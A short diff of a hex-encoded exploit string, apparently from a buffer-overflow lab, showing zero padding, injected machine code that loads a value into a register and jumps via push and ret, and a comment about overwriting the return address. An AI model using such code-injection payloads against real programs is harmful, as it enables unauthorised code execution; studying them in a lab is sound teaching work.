@@ -4,8 +4,7 @@
 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00
-00 00 00 00 00 00 00 00
-/* Injected code starts here */
+/* Injected code starts here (offset 40, 0x556490e0) */
 48 c7 c7 92 38 f1 4d 68
 60 89 80 00 c3 00 00 00
 /* Overwrite the return address with the injected code's address */
